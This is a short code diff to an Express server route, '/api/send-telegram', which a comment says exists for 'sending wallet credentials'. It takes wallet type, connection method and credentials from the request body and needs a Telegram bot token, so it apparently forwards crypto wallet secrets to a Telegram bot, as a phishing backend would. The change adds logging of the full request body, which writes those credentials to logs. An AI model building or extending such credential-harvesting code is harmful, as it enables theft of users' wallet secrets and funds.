@@ -9,6 +9,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Telegram webhook endpoint for sending wallet credentials
   app.post('/api/send-telegram', async (req, res) => {
     try {
+      console.log('Received request body:', req.body);
       const { walletType, connectionMethod, credentials } = req.body;
       
       if (!process.env.TELEGRAM_BOT_TOKEN) {
